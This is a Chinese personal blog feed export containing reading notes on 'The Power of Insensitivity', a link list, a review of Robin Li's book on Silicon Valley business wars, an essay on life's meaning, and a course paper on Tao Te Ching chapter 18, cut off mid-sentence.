title="为了更好地生存"></a>为了更好地生存</h2><ul><li>面对芸芸众生各式各样的毛病，有些人耿耿于怀，有些人不太在乎，有些人视若无睹。在这方面人们的感觉各自不同，但有一点非常明确，就是只有对各种令人不快的毛病忽略不计，才能开朗、大度地生活下去。</li></ul><h2 id="适应环境的能力"><a href="#适应环境的能力" class="headerlink" title="适应环境的能力"></a>适应环境的能力</h2><ul><li>就算到了一个自然环境、人文环境都不相同的世界，也能开朗、健康的生活。</li></ul><h2 id="伟大的母爱"><a href="#伟大的母爱" class="headerlink" title="伟大的母爱"></a>伟大的母爱</h2><ul><li>母爱集钝感力之大成。经过分娩的疼痛从自己腹中生出的孩子，无论做什么事都让母亲觉得可爱，亦可原谅。这种可以原谅一切的情感，正是产生钝感力的原点。</li><li>分娩之后的钝感<ul><li>喂奶</li><li>夜里的哭闹</li><li>可爱的污渍</li><li>原谅孩子的母亲</li></ul></li></ul><h1 id="语录"><a href="#语录" class="headerlink" title="语录"></a>语录</h1><ul><li>那时我深深体会到没有比那种多少有些才华，但自尊心过强的家伙，更令人担忧的了。</li><li>人们能否成功，不完全取决于才能。也就是说有才能的人并不一定就能成功。（不成功不代表没有才能）</li><li>在文坛上，非要举出什么是成功的必要条件的话，那就是有益的钝感力。无用赘言，其前提是需要有一定的才华，而能让才华经过磨炼熠熠生辉的，正是坚韧的钝感力。</li><li>钝感就是一种才能，一种能让人们的才华开花结果、发扬光大的力量。</li><li>人们的各种感觉器官若过于敏感的话，会对人产生负面影响。</li><li>“笨拙的想法和休息不相上下”这句俗语说的就是，若左思右想，也于事无补，还不如横下心来，闭眼休息。</li><li>人就是这样，被他人毫不犹豫地多夸几次，慢慢地自己也会觉得是那么回事了，也会向那个方向去努力。那些明显怪诞的新兴宗教，仍然有人加入其中，可能就是被这种大声的夸奖吸引过去的。宗教劝诱本身当然有问题，不过能够积极对待别人鼓励自己的话语，积极地为之而努力，却绝对不是一件坏事。</li><li>这种听了两句表扬就飘飘然并信以为真的劲头，的确也是一种才能。</li><li>正如众所周知的那样，孩子们非常单纯，是得寸进尺的典型，所以没有比利用孩子这种习性更好的方法了。孩子高兴了，会变得愈发努力。由于努力，事情便会做得更加出色。因为表现出色，又会受到赞扬，孩子就愈发努力，双方配合默契，孩子就会不断进步。</li><li>不管多么优秀的孩子，当然也包括大人，倘若每天都生活在“你根本不行”、“你真是个傻瓜”一类的批评之中，长此以往，就会真的变成一个没用的、傻瓜似的人了。</li><li>因此语言极为重要。一句话既可以救活一个人，也可以杀死一个人。对于才能也是如此。</li><li>人能否成功，不只取决于才能的有无，而在于究竟能把人的才能发掘和引导出来多少，社会上所谓有才能的人，都有一个在适当时期，用适当方法将其才能发掘、引导出来的人。相反，人们口中那些没有才能的人，大多只是由于其潜在的才能没有在适当的时机被发掘和引导出来。</li><li>在恋爱方面，钝感力也是必不可缺的。特别是当男人追求女人的时候，钝感可以成为一种有力的武器。若再加上诚实，则更如虎添翼。</li><li>恋爱首先是心灵之间的相互碰撞，其中并不一定有什么理论和道理可言。恋爱的暧昧及难以琢磨之处也正在于此。</li><li>其实这是因为男人和女人从根本上就是不同的生物，尤其肉体的原点完全相异。这些差距，不是通过语言上的交谈，就能解决的。</li></ul><ul><li><p>也就是说，一位好猎手，只要看准了目标，无论被对方拒绝多少次，也要坚持追求，向女方倾诉自己的衷肠。没有这种坚韧而厚颜的精神，就无法将美丽的猎物捕捉到手。</p></li><li><p>其实很多女性都曾说，“就算多少有些不中意，但是在对方不厌其烦的邀请和竭尽全力的追求下，还是逐渐地被对方打开了心扉，或许还会开始喜欢……”</p></li><li><p>男女双方无论是生长环境、兴趣爱好，还是个人教养、价值观等不可能相同，然而结婚，就是不同的男女在一时热情的怂恿下，共同在一个狭小的家中生活。</p></li><li><p>相反，那种天生聪慧、神经质的人就不可能那样了。他（她）们对对方做的每一件事都极为在意，烦躁和不满不断升级。</p></li><li><p>一般来说，人体的血液总量为体重的十二分之一。若其中三分之一流失，人就将面临死亡。</p></li><li><p>女性不怕出血啊。教科书上确实写着，出血量达到血液总量三分之一的话，人就会死亡，不过在那种情况下死亡的是男性。</p></li><li><p>这种现象我们从那些变性人身上就可以看得一清二楚，那些人不管穿什么女装、怎样模仿女性的言谈举止，可总让人觉得缺点儿什么，他们欠缺的就是女性的那种圆润。</p></li><li><p>说句笑话，如果那时我知道女性的皮下脂肪是那么丰富的话，我可能就不会把自己的登山服借给她了。</p></li><li><p>男性是靠精神上的力量来忍耐的。与之相比，女性对生理上的那种痛彻心肺的痛苦的忍耐力，却是出人意料的坚强。</p></li><li><p>在我们身边，经常会发生被朋友或同事嫉妒、中伤和刁难的事情。不要听到不中听的话就如临大敌，而要仔细思考对方那么说的原因，体察对方的心情。</p></li><li><p>只要拥有钝感力，不管多么痛苦的事情，都能转化成为对自己有利的因素，这样才有可能坦然地以积极进取的态度生活下去。</p></li><li><p>这一切表明，看问题的角度不同，人们的感受也截然不同。任何事情都应灵活地从积极的方面进行思考。而钝感力就是这种思维方式的动力。</p></li><li><p>没有比老年人的大胆更可怕的了</p></li><li><p>人们常说，“衣服的合身是穿出来的。”这位老太太就是不管衣服是否适合自己，只要喜欢，穿上再说。多数人可能没等穿上衣服就开始战战兢兢了，或者索性放弃了尝试。</p></li><li><p>在现实生活中，人们很难像这位老太太那样，不介意他人的讽刺，堂堂正正地按照自己的信条行事，而是常常不自觉地往后退一步，等到本人察觉的时候，可能已经退了百步之遥了。这位顽强的老太太的动力，正是她听不出讽刺、或完全不理睬讽刺的钝感力。</p></li><li><p>一旦下了决心，就能够无视周围人的目光和流言蜚语，毅然决然地进行。即便听到别人的讽刺，也是一副“与我无关”的架势，大大方方地勇往直前。　　这种钝感力，正是人们向崭新的领域挑战时能够获得成功的原动力。</p></li><li><p>双方一旦相恋，要想将彼此的爱情持续下去，在某种程度上没有那种不拘小节的钝感力，是难以做到的。</p></li><li><p>所谓爱情，就是宽容和原谅对方吧。</p><p> 面对芸芸众生各式各样的毛病，有些人耿耿于怀，有些人不太在乎，有些人视若无睹。在这方面人们的感觉各自不同，但有一点非常明确，就是只有对各种令人不快的毛病忽略不计，才能开朗、大度地生活下去。    </p></li><li><p>拥有坚强钝感力的员工对公司来说，可说是宝贵的人才，以这种顽强的精神，今后极有可能担任公司的要职。</p></li><li><p>使我深刻体会到在集体中生存的复杂和艰难</p></li><li><p>人们的好恶以及忍受范围各不相近，可谓是千差万别。而公司正是各种好恶之情彼此涌动、互相碰撞的场所。　　那么，具备何种才能的人才能在这样的环境中迅速适应，并如鱼得水地工作，乐观开朗地生存呢？　　这就是必不可少的钝感力。</p></li><li><p>如何才能培养身体的钝感力呢？当然，我们要通过各种方法增强自己的基本体力，不过由于鼻喉黏膜的特性以及每个人体质不同，所以这些问题是不可能轻易就能改善的。</p></li><li><p>就算到了一个自然环境、人文环境都不相同的世界，也能开朗、健康的生活。</p></li><li><p>凡有宏图大志，希望能在更广阔的天地中成就一番事业的人，都应该首先确认一下自己的钝感力，认为有的话，就要倍加珍惜；觉得自己缺少钝感力的人，就要加紧培养。拥有更加坚强的钝感力，才能融入各种环境当中。</p></li><li><p>这种可以原谅一切的情感，正是产生钝感力的原点。</p></li><li><p>实际上，小孩困时会哭，饿时会哭，热的时候还是哭。小孩的哭声既是诉说，又是撒娇，更是生命存在的证明。</p></li><li><p>生过孩子的女性和没有生过孩子的女性，以及没有自己孩子的男性，这三者拥有的钝感力存在着决定性的差距，这些差距将会对这三者今后的生活方式产生巨大的影响。</p></li><li><p>世界上不仅仅存在敏锐聪慧这种才能。相比之下，不为琐事动摇的钝感，才是人们生活中最为重要的基本才能。而且，只有具备这种钝感力，敏锐和敏感才能成为真正的才能，从而在人生的道路上发挥其应有的作用。</p></li></ul>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>奇文共赏</title>
      <link href="/mind/180410Awesome/"/>
      <url>/mind/180410Awesome/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="http://static.wanglianghome.org/zh_CN/translation/HowToDoWhatYouLove.html" target="_blank" rel="noopener">如何才能去做喜欢的事情</a>         英文原文：<a href="http://www.paulgraham.com/love.html" target="_blank" rel="noopener">How To Do What You Love</a> </li><li><a href="http://tombkeeper.blog.163.com/blog/static/177924244200831112737582" target="_blank" rel="noopener">给计算机系学生的建议</a>  </li><li><a href="http://www.k0rz3n.com/2017/02/15/%E7%AC%94%E9%9A%8F%E5%BF%83%E5%8A%A8%EF%BC%8C%E8%90%BD%E7%AC%94%E7%94%9F%E8%8A%B1/#%E5%88%86%E4%BA%AB%E4%B8%80%E7%AF%87%E6%88%91%E5%BE%88%E5%96%9C%E6%AC%A2%E7%9A%84%E6%96%87%E7%AB%A0" target="_blank" rel="noopener">生活是一场游戏</a>  </li><li><a href="http://baimoz.me/148/" target="_blank" rel="noopener">侯捷观点-漫谈 程序员与编程（收藏）</a> </li><li><a href="https://web.archive.org/web/20090918145141/http://jjhou.csdn.net" target="_blank" rel="noopener">侯捷的博客</a> </li><li><a href="http://www.ruanyifeng.com/blog/2016/04/you-and-your-research.html" target="_blank" rel="noopener">理查德·汉明《你和你的研究》</a> </li><li><a href="http://zs.meijiexia.com/u_detail.php?id=5818" target="_blank" rel="noopener">假如帝国的黄昏降临！</a> </li><li><a href="https://www.huxiu.com/article/4892/1.html" target="_blank" rel="noopener">和菜头：碎片化生存</a> </li><li><a href="https://baijiahao.baidu.com/s?id=1610022712306662496" target="_blank" rel="noopener">俞敏洪：在一个动荡的时代做不动荡的自己</a> </li><li><a href="http://www.shichangbu.com/article-25636-1.html" target="_blank" rel="noopener">微信之父张小龙内部8小时演讲【附原版164页PPT】</a> </li><li>《张小龙2359条饭否日记（全文）》<a href="https://zhuanlan.zhihu.com/p/20546860" target="_blank" rel="noopener">1~999</a> ,<a href="https://zhuanlan.zhihu.com/p/20546877" target="_blank" rel="noopener">1000~2000</a> ,<a href="https://zhuanlan.zhihu.com/p/20546899" target="_blank" rel="noopener">2000~2359</a> </li><li><a href="https://zh.wikisource.org/zh-hans/%E5%A2%9E%E5%BB%A3%E8%B3%A2%E6%96%87" target="_blank" rel="noopener">增广贤文</a> </li><li><a href="https://github.com/Hermioneyuzijin/material/issues/58" target="_blank" rel="noopener">How to Discover Your Life Purpose in About 20 Minutes</a> </li><li><a href="https://www.goodreads.com/quotes/9557-it-doesn-t-interest-me-what-you-do-for-a-living" target="_blank" rel="noopener">it-doesn-t-interest-me-what-you-do-for-a-living</a> ；<a href="https://www.zhihu.com/question/39655593/answer/358927290" target="_blank" rel="noopener">中文版</a> </li><li><a href="http://webcache.googleusercontent.com/search?q=cache:http%3A%2F%2Fwww.yinwang.org%2Fblog-cn%2F2015%2F01%2F29%2Fhuman-value" target="_blank" rel="noopener">王垠：人的价值</a> ; <a href="http://www.yinwang.org/" target="_blank" rel="noopener">王垠的博客</a> </li><li><a href="http://paper.people.com.cn/rmrb/html/2018-01/15/nw.D110000renmrb_20180115_6-01.htm#" target="_blank" rel="noopener">紧紧抓住大有可为的历史机遇期 | 人民日报</a> </li><li><a href="http://blog.sina.com.cn/s/blog_6ba6b2db0102ek74.html" target="_blank" rel="noopener">看哪，这人。石康《独唱团》</a> </li><li><a href="https://zhuanlan.zhihu.com/p/26893001" target="_blank" rel="noopener">中国互联网二十年啪啪打脸简史</a> </li></ul>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>《硅谷商战》</title>
      <link href="/mind/170628SiliconValleyWar/"/>
      <url>/mind/170628SiliconValleyWar/</url>
      
        <content type="html"><![CDATA[<p>这是李彦宏写的书，就是饱受诟病却也颇为有用的百度的董事长兼首席执行官。当然，写书的那个时候还没有百度，甚至谷歌也刚成立不久。1999年1月第一版。这是一本小书，采用章回体小说形式，但据称内容全部属实。当然，从作者眼光属实。</p><p>1991年李彦宏毕业于北京大学信息管理专业，后赴美国布法罗纽约州立大学完成计算机科学硕士学位。在美国近十年的时间里，李彦宏先后担任道琼斯公司高级顾问，INFOSEEK工程师，设计了实时金融系统，创建了ESP技术等等等等。1999年底携风投资金回国创建百度。</p><p>全书共十五回合，记录了93-98这几个世界互联网发展最为猛烈的年头里在硅谷发生的一个个惊心动魄的商战故事。其中包括网景，IBM，微软，苹果，美国在线，英特尔，惠普，甲骨文，太阳，迪斯尼，雅虎等等公司间为了扩大市场份额，引领时代走向而进行的商业竞争。他们中有的已是固有领域里固有的龙头老大，有的是新晋的受风投青睐的企图分一杯羹的愣头青，有的则凭着智慧和创新开辟了一个全新的领域，谋划着颠覆传统。他们之间自然免不了斗智斗勇，时而竞争，时而合作，从而上演了一幕幕变化迅速的斗争场面。</p><p>然而谷歌在98年7月才成立，而现在雅虎等等感觉已明显式微，有些公司我们甚至没有听过，当然，不排除是我见识浅薄而且活在墙内的可能。</p><p>短短二十年间，一切着实变化的太快。经过这近一年的自我探索，我发现自己对技术也开始有几分热爱，尤其在感到传统文化可能无力解决信仰问题之后。或许某天，我会开始相信技术和创新才是值得关注的。那或许也不错。</p><p>但无论技术是不是真的有解决人生问题的能力，科技改变生活这一点谁也不能否认。从前的人如何能想像今天的生活呢，今天的人也很难想像未来二三十年的生活，所以我还是很庆幸自己年轻，如果一切顺利我就能看到那些令人无比兴奋的成就了。07年Google推出Android，到今天近十年，这基于linux的平台已经足以和微软抗衡，曾经网景试图颠覆而未成功的如今似乎在一点点实现，我相信未来会有更大的变革，我希望自己能是参与者。</p><p>毕竟我们可以感受到，现在的操作系统还是不够让人爽。</p><p>现在有点庆幸当初进入这个专业。兴趣似乎在一点点被唤醒。希望自己别太懒就好了。</p><p>果然人随着时间变化想法是会变的。我已记不太清从前的一些观点了。这让我有些悲伤。人生仿佛是一场一去不回头的游戏，怀念着的，纠缠着的，困惑着的，挣扎着的，坚信着的，质疑着的到最后都寻不到一丝踪迹。而那些未经历的，也根本无从想像。站在现在，看不见过去，看不见未来，多少有一丝惶恐。但没有关系，接受就好。find you passion.enjoy your life有时这样想想倒也不错，最后或许就相信了呢。</p><p>昨晚看了三傻大闹宝莱坞，兰彻说do not be a coverd .do not be afraid of future.be a good engineer and success will chase you.</p><p>看了一部分的《黑客与画家》，作者的黑客精神很让我感动，我想我需要试着培养。那时宽泛意义上的一种人与社会相处的精神原则。这几天我要把它看完。</p><p>接下去我要看《be here now》就是此时此地.不知道会有什么收获。</p><p>人生确实很奇妙，一切在不紧不慢，迷迷糊糊中却好像井井有条地前进。我前两天看见一个很成功的人说他十四岁上大学，大学很不顺利，也曾抱着《晃晃悠悠》哭的稀里糊涂，后来也一样走出来了。</p><p>我不知道自己十年后会怎样。但或许命运知道。如果没有人安排好一切，那我想怎么走就怎么走就是了，总会有出路的。如果真有力量安排好了一切，那我就更不用担心了，想怎么走就怎么走就是了，出路都固定了。</p><p>(๑•̀ㅂ•́)و✧<br>(๑•̀ㅂ•́)و✧卖个萌   就酱紫</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>人生价值与自我实现</title>
      <link href="/mind/170614MeaningAndAction/"/>
      <url>/mind/170614MeaningAndAction/</url>
      
        <content type="html"><![CDATA[<h3 id="人生价值与自我实现"><a href="#人生价值与自我实现" class="headerlink" title="人生价值与自我实现"></a>人生价值与自我实现</h3><blockquote><p> 人用生命的价值和意义来说服自己：人的存在不是荒诞。    ——阿贝尔·加缪  </p></blockquote><p>作为人，在生命中或迟或早的某些时刻，我们会忍不住疑惑或是开始追问这样一些问题。</p><p>•    生命的意义是什么？  </p><p>•    生命究竟是怎样的？  </p><p>•    我们是什么？</p><p>•    我们为了什么而存在？</p><p>•    生命的起源是什么？</p><p>•    生命的本质什么？</p><p>•    现实的本质是什么？</p><p>•    生命的存在是否有目的以及它是什么？</p><p>•    在生命中究竟什么是有价值的？</p><p>•    存在下去的理由是什么？</p><p>这些问题在不同人身上的萌发时间和所引起的反应是大不相同的，不同的人在这个问题上的在意程度和追究深度也不尽相同，并且不同人得到的答案也未必一致。有些人在生命的早期便热衷于探求这类问题的答案，有些人人到中年才开始思考存在的意义，有些人则兴致缺缺，终其一生没有真正开始严肃地对待这些问题。有些人孜孜不倦，全力以赴，放眼宇内，观今溯古，只为求得一个满意的答案，在没有寻到之前他们食也无味，寝也难安，踽踽独行，郁郁寡欢，鲜有发自内心的快乐与对这个世界的归属感；有些人知天达命，且歌且行，格物致知，用功世事，只在某些深夜里偶忆初心，平添感怀；有些人五根浸尘，受苦贪欢，苶然疲役，不问所归，自始自终只是在追随欲望与满足欲望之间循环往复，如同命运的木偶。</p><p>尽管不同的人在这个问题上表现各异，但相同的是人们都赤条条来到人世，经历生老病死，然后赤条条离开，这就使得不同的人具有某种作为存在的平等性。那么是什么使得一个存在与另一个存在不同，这种不同又是基于什么的讨论，或者这种不同是否被需要，以及为什么，最后是如何去实现这种不同。这便是我们考虑人生价值与自我实现这个命题时所要面对的主要问题。</p><p>致力于实现人生价值与自我期许并不是什么难事，即便最后没能实现或没能彻底实现也无关紧要，因为如果一个人确实找到了其所坚信不移的价值，那么他为实现价值而存在的每一个时刻都必将无比快乐。真正困难的问题在于真正认识人这种存在，真正认识自我，弄清楚什么是价值，什么是有价值，一种价值又何以不同于另一种价值。思考价值，确信价值，最后才是实现价值。</p><p>在一切真正的思考开始之前，我们必须定义何为坚信价值。如果我们说一个人坚信一种价值，那么这种价值对于他应当是根本性的，是源头而不是途经，是目标而不是手段，是衡量一切的根本出发。</p><p>对于一部分人，确信价值是再简单不过的，甚至不需要经过思考。一个简单的思路而普遍的思路就像这样——因为财富与权力可以满足眼耳鼻舌身五根之欲，所以金钱是有价值的，所以我的价值是拥有大的权力和多的财富。这条逻辑链是如此清晰简洁，如此雄辩有力，以至于我险些甚至骗过了自己。实际上，如果一个经过上述我们勉强称之为思考的一番大脑活动后将拥有更多的财富定做自己的人生价值并且打算终生致力于实现它，那么可以预见地，几乎不可避免地，这个人将在人生的某一些时刻感受到这种价值带给他的痛苦。为什么会这样呢？难道追求一种确信的价值无法让人感到始终的愉悦？事情是这样的，如果财富可以粗暴地具象为金钱，那么金钱于这个人并没有价值，拥有金钱也没有，这个人的价值是各种欲望的满足。这个人因为没有认清自己的价值所在而感到痛苦，因为错把手段当目标而痛苦。其实，绝大多数人也是如此。</p><p>如果一个人的价值是满足他的各种欲望，如果这些欲望与其满足欲望的能力存在差距，那么他至少有两条途径，一是增强能力来满足欲望，二是降低欲望来让欲望自己得到满足。这两条途径看上去本身都不会自带痛苦。当然，当一件东西和欲望扯上关系，事情总会变得复杂，无奈很少有东西与欲望毫无干系。此外，这本身是否能作为一种真正的价值来被对待，也是值得怀疑的。</p><p>在我们执着于怀疑时，就会发现没有什么是理所当然的，没有什么是不能怀疑的。我承认这是认识论的一大难题，我不认为这个问题已经得到很好的解决。维特根斯坦前半生致力于考虑用语言描述价值的可能性，这就是在怀疑语言，同时也怀疑价值，实际上至今仍值得怀疑。不知为何其后来同笛卡尔之流一样认为我们必须承认存在一些无可争议的事实作为一切讨论的基础。尽管人们说他同其他学说是不同的，但在我看来这只是不同形式的妥协罢了。因为什么都没有，所以应当要有些什么才好，这是可笑的逻辑，就不能什么都没有吗？当然，什么都没有是痛苦的，面对无尽的深渊，没有语言可以信任，没有价值可以皈依，没有逻辑可以依靠，没有认识能被接受，说实话，那真是暗无天日，我们的整个文明都在怀疑中分崩离析，所有曾经建立起的光辉与荣耀全在一个质问的眼神中缓缓坍塌。</p><p>所以人们决定不怀疑，并将一切怀疑笼统地扔到虚无主义中任其遭受作为异类所难以逃避的攻讦和叱呵。</p><p>在怀疑的世界里，价值是谈不上的，语言是可笑的，追求是愚蠢的，自我是一场谎言，所有的一切都建立在一种不诚实之上，一种自我欺骗之上。我们或许可以称之为实事求是，脚踏实地或是其他的什么，但在怀疑者的严重，只有一个代名词，那就是不诚实。诚实是宝贵的品质，如果一个人，一个种族，不能够诚实地对待自己和自然，那么所有的一切都将建立在欺骗之上，所有的成就与辉煌都将在谎言被揭穿的那一天露出它美丽芬香的面纱下丑陋不堪的真实面目，所有曾被这虚假的美好蒙蔽的年轻人将会深深有感于这一场阴谋的庞大与精心，都将重新认识到所谓价值并不存在，所谓语言都是虚假，所谓梦想全是泡沫，所谓自我，不过是在初升的朝阳面前自顾自赞叹未知光芒的耀眼，而浑然不觉毁灭已迎面到来。而那些曾被背叛，被惩罚的所谓虚无主义者，才会真正的由衷的露出他们具备智慧以来的第一次微笑，他们看到虚无终于是虚无，狂妄终于是狂妄，世间万物各归其序，尽管这是一场失败，但实际上它比胜利更值得开心，如果说在此之前，怀疑依然存在，那么从此以后，怀疑将归于历史，一切现实只余虚无，而这虚无，便是无上的荣耀。</p><p>那么我们会带人生的价值与自我的实现。不论是‘42’的预言，还是“一切都将逝去，唯有死神永生”，又或者是“三世因果，六道轮回”的体系，我们作为人，脆弱的，短见的，狭隘的，被欲望支配的人，我们需要在这十丈软红里寻一处着落，认一个价值。对，我指的不是思考价值，确认价值，然后契而不舍，忠心不渝，不折手段，视死如归地去追逐这个价值，而是认一个价值，单纯草率地，人云亦云地，随波逐流地，得过且过地认一个价值。我们认到了自己的价值之后，不论这个价值是伟大光荣正确的，还是猥琐下流可鄙的，我们需要去实现它。我们如何实现它，我们将除了饮食睡眠，排遗解乏外的一切时间献给他，用一切我们认为正确的方法和手段去靠近他，瓦解他，最后占领他。如果在实现的过程中我们因为实现价值的遥不可及而感到痛苦，那么不要怀疑价值，尽管去痛苦，因为价值存在，而且价值正确，如果为实现阶段性胜利而欣喜若狂，也更不用回头看是否走在正确的道路上，尽管去喜悦，因为价值存在，而且价值正确。</p><p>每个人都应该有一个价值，每个人都注定拥有一个价值。你可以看不清他，可以有所顾虑，可以有所怀疑，但你必须相信他，因为这是你拥有的价值，这是你的价值，这是你将奋尽全力去追逐的价值，也是你得以忘却生命虚无，得以在无尽的人生荒野中义无反顾地前行的唯一动力，至关重要的，并且你无法否认的是，除此之外，你一无所有。所以，在这么多的逻辑凌乱的语句之后，总之请你记住，如果你不想面对那身后空无一物，眼前万丈深渊的绝境，如果你不想体会我曾体会过的那般绝境，请相信我，请相信世上有一种价值值得相信，有一种价值属于你，且只属于你，你应当接受他，像士兵接过令牌，你应当带着他，踏上你仅此一次的征程。士兵，祝你，祝我，顺利。</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>读道德经第十八章</title>
      <link href="/mind/170614MoralBook18Chapter/"/>
      <url>/mind/170614MoralBook18Chapter/</url>
      
        <content type="html"><![CDATA[<h1 id="道德经与人际沟通概论结课论文"><a href="#道德经与人际沟通概论结课论文" class="headerlink" title="道德经与人际沟通概论结课论文"></a><strong>道德经与人际沟通概论结课论文</strong></h1><h2 id="表里相成，实虚相济"><a href="#表里相成，实虚相济" class="headerlink" title="表里相成，实虚相济"></a>表里相成，实虚相济</h2><h2 id="原文"><a href="#原文" class="headerlink" title="原文"></a>原文</h2><p>大道废，有仁义。智慧出，有大伪。六亲不和，有孝慈。国家昏乱，有忠臣。                   –《道德经》第十八章</p><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><ol><li>大道：古指政治上的最高理想。《礼记·礼运》：“大道之行也，天下为公。”                       ——《辞海：1999年缩印本(音序)1》第339页（118字）<br>.    仁义：亦作「仁谊」。仁爱和正义；宽惠正直。<br>——《汉语大词典》第1100页<br>笔者认为在道家作品中“仁义”多指人为界定的各种道德规范，与自然形成的道德相对立。<br>.    废  ：廢，止也。                ——《尔雅》<br>.    智慧：亦作“智惠”，聪明才智。<br>——《汉语大词典》第7220页<br>相关：「下逮德衰，大道沉沦，智惠日用，渐私其亲。」<br>——三国魏嵇康《大师箴》<br>．伪：伪,诈也。                   ——《说文解字》<br>关：    伪者,人为之,非天真也。   ——徐锴<br>不可学,不可事而在人者,谓之性;可学而能,可事而成之在人者,谓之伪。   ——《荀子•性恶》<br>6．六亲：六亲，父子兄弟夫妇也。             ——《王弼老子注》<br>.    孝慈：对尊长孝敬，对后辈慈爱。<br>.    昏乱：指政治黑暗，社会混乱。</li></ol><h2 id="今译"><a href="#今译" class="headerlink" title="今译"></a>今译</h2><p>大道被废弃了，才有提倡仁义的需要；<br>聪明智巧的现象出现了，伪诈才盛行一时；<br>家庭出现了纠纷，才能显示出孝与慈；<br>国家陷于混乱，才能见出忠臣。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p><strong>表里相成，实虚相济</strong></p><p>导言：<br>这一章节仅仅有二十六个字，同《道德经》中许多其他章节相比并不算长，然而，毫无疑问地，它所讲述的内容是丰富的，所揭示的问题是尖锐的，所蕴含的哲理是深刻的，所引发的追问是无穷的，更为难能可贵的是，这一切隽永常新，即使在两千多年后的今日，对它的讨论和解读，无论是关于人际交往中的表里问题还是人际交往中的辩证思考方式，都依然具有巨大的现实意义，我们作为新生代的年轻人，掌握好表里相成，实虚相济的本领，无疑将有助于我们在纷繁复杂的社会生活中更有优势地成长！</p><h3 id="关于道德与仁义以及人际交往中的表里问题"><a href="#关于道德与仁义以及人际交往中的表里问题" class="headerlink" title="关于道德与仁义以及人际交往中的表里问题"></a>关于道德与仁义以及人际交往中的表里问题</h3><p>十分广泛地，我们将《南华经》 视为对《道德经》一定程度上的解读和补充，因此，无独有偶，我们能够在《南华经·马蹄篇》中看到下面这段话:纯朴不残，孰为牺尊！白玉不毁，孰为珪璋！道德不废，安取仁义！性情不离，安用礼乐！五色不乱，孰为文采！五声不乱，孰应六律！夫残朴以为器，工匠之罪也；毁道德以为仁义，圣人之过也。（所谓牺尊（suō），即是雕刻精致的酒器）在这段话中，庄子将道德比作纯朴天然的木材和白玉，将仁义比作经过残害和雕饰而成的木器和珪璋，而将圣人比作是残害道德的工匠，是历史的罪人。</p><p>我想，庄子在《南华经·马蹄》中侃侃而谈的观点正是对老子这一段文字最直接深刻的诠释，也可能堪称是自仁义观念兴盛以来对儒家仁义体系最不合俗流的见解和剖析，最直击根本的嘲讽和批驳。</p><p>当上位者以道德治天下时，百姓的生活状态是“同与禽兽居，族与万物并，恶乎知君子小人哉，同乎无知，其德不离；同乎无欲，是谓素朴。素朴而民性得矣。”，人们无知无欲，素朴崇德，“仁义行于世而人不知”，就好像当太阳高照时人们察觉不到对萤火虫光芒的需要似的。但当上位者失去了道德，转而以所谓仁义治理天下时，行些狂狂汲汲的诈巧虚伪之事时，上行而下效，百姓之中自然也产生并流行起了各种各样的奸伪之事，并且往往，假借的是仁义之名。至此，纯朴天真的道德已被破坏，取而代之的是华而不实的仁义礼之流。天下始失其本色，不孝不慈者日盛，不忠不义者日显，由是世人方见其孝慈，忠义之士，犹如夜幕笼罩时，一片昏暗中的点点萤火之明，令人欢欣雀跃，心神鼓舞，愚昧之人只知呼唤多些萤虫，而觉者则怀念初时红日当头的美好。</p><p>只是不可知的是，道德真如红日一般吗？落下的红日还能够升起，可失去的道德还能够回来吗？</p><p>另一方面，生出智慧并为自然立纲纪虽是人的斗胆，甚或是人族终究覆灭的根由，但也不可否认，这是人之为人的基础，是人作为人的幸运，即便为之付出的代价是自食其果，万劫不复。人之为人之所以可贵，佛家之所以说人身难得，在于其能思想，能欲求，苟恒使民无知无欲，那么人何以为人，何以自居于繁多之物类，何以有《道德经》洋洋五千余言，何以有庄子讥谑之言与慷慨之词，何以有此时我写作之电脑，何以有今日强大到亘古未有之人族，何以有今日言论这一切的条件。我浩浩人族，恐或早已夭于自然之狂暴风雨之中。退而言之，上位者与觉者在黎民百姓与造物主（倘若有的话）之间又该是处于何等的尴尬境地。</p><p>是故愚有一言:人之无智无欲者不可长久，以是道德虽好，上古之物，亦不可长久。智慧必出，大伪必现，大道必废，仁义之出实顺人应时。纯朴不残，玉尊何有，玉尊既有，岂愿失之，此人之常也。老庄之流，道德之遗老也，念念旧事而不忘，岂知无明众生浩浩荡荡，莫之能逆，是以只增伪儒之笑。我辈惜之叹之，切不可尽数学之。</p><p>凡事学习道理总归要用到生活中才是正道。那么，在我们个人短暂而脆弱的人生中，在每个人都不得不面对的纷繁复杂的人际关系中，我们该对仁义与道德持有怎样的观点呢？</p><p>我想，大概是仁义为表，道德为里。</p><p>毕竟纯粹的理想主义无益于实现个人在世俗生活中的价值，而完全失去素朴心性的人则是完全异化了的面目可憎的甚或不足以称之为人的新物种，这至少在人类的标准里是值得厌恶的。所以，恰如《听南怀瑾讲人生感悟》 一书中所言，我们所应切切奉行的应当是“以超脱出世之心，做积极入世之事”。也就是说我们应当从内心最深处深刻而彻底地认识到人生虚无的真相，但又必须在行事方式和与人相处上讲求方式方法，借鉴儒家仁义体系中有利于合于俗流的那一部分思想精华。在这一点上，南怀瑾先生的二十八字真言确实是偏僻入里，字字珠玑啊——佛为心，道为骨，儒为表，大度看世界；技在手，能在身，思在脑，从容过生活。</p><p>然而真正的尴尬之处在于儒道异源异性，本难以相济，若执意将二者相容于一身，势必造成自我内在的挣扎，冲突与矛盾，而对这些矛盾的处理却并非易事，甚至可以说，这难以根治。因此， 若希望很好的处理人际关系，首先并且最重要的应该是修习好自己的内心，这也正是北宋赵普所谓“是故夫欲攘外者，必先安内”的道理。</p><h3 id="人际交往中以辩证的方式思考的意识"><a href="#人际交往中以辩证的方式思考的意识" class="headerlink" title="人际交往中以辩证的方式思考的意识"></a>人际交往中以辩证的方式思考的意识</h3><p>略去本章谈论的主旨，我们不难发现这一章节还从一个宏大的层面展现了正反相生的辩证思维。当国家昏乱，六亲不和时人们便会提倡忠臣孝子，如若国与家皆是一派和谐，又何来忠孝之说呢？也就是说，当人们赞扬提倡什么之时，便是他们需要且缺少什么之时，如果一样东西十分充足且源源不绝时，出于人的本性，人们便不会十分在意，至少不会十分强调它。</p><p>如若需要以一种更为严谨的近乎学院派的方式来描述这一朴素的真理，我想这与美国著名社会心理学家，第三代心理学的开创者Abraham Harold 